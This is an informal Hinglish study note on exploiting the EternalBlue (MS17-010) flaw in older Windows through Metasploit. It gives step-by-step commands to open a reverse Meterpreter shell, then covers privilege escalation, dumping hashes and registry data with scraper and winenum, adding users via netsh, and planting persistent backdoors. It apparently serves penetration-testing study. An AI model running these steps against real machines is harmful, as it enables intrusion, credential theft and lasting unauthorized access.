So basically Eternal Blue means ek Vulnerability from which humko pura system ka access milta hai from user access to root privilege just from having IPv4 address and non isolated machine matlab vo machine should be alive and connected to netwrok

#### Kaha pe milega yeh 
- Windows Operating Systems 
- Windows 7 or Below
#### Kaise Pata Chalta ki yeh vulnerability hai ya nahi 
- Reconnaissance karte waqt jab we scan with [[Nmap]] with *Vuln Script* in Nmap NSE then it gives you vulnerability named ***MS17-010*** agar yeh aaya tho samjh lena we can exploit this machine. and yeh machine is vulnerable to Eternal Blue.
### Attack Phase 
#### Exploitation 
- Yeh hum [[Metasploit]] use karke kar sakte hai 
- Steps :
	-  get into `msfconsole`
	- Then `search ms17-010`
	- Usme bahot options aayenge usme se `use /exploit/windows/smb/ms17-010_eternalblue `
	- Then `set RHOSTS <Target_IP>` &  `set LHOST <Khud ka IP>` , `set LPORT 4444`
	- iske baad isme payload add karneka zarurat nahi hai as Reverse TCP shell wala payload added hota hai by default
	- Then `exploit`
	- Iske baad you get [[Meterpreter]] shell opened .
#### Post Exploitation
- Jab [[Meterpreter]] shell khulega first important steps are to get information
	- Run `sysinfo`,`getuid`,`getpid` 
	- yeh chalana important hai because from `getpid` tumhe pata chalta hai ki tum konsa process create karke aaye and then jab `ps` chalaoge you will get tera privilage kya hai like low privilage hi hoga but then `ps` mei you get to see root ka pid like after wards you can migrate and do ***Privilege Escalation*** and do all root actions like create user give access and privileges by using [[Netsh]]. 
- But before privilage escaltion and all humko ek aur important kaam karna hota hai which is to run two scripts `scraper` & `winenum` yeh dono isliye karna hai ki 
	- **Winenum:** Will download all the Windows target, gathering user information, system details, and network
	- **Scraper:** Will download all the target system for information, typically dumping hashes, registry keys, and other system data
- Iske baad you have to create Backdoor using *Persistent Backdoors* 
- After this you have completed all the important job abb you can continue whatever you want to perfom on that machine or even report to the client.
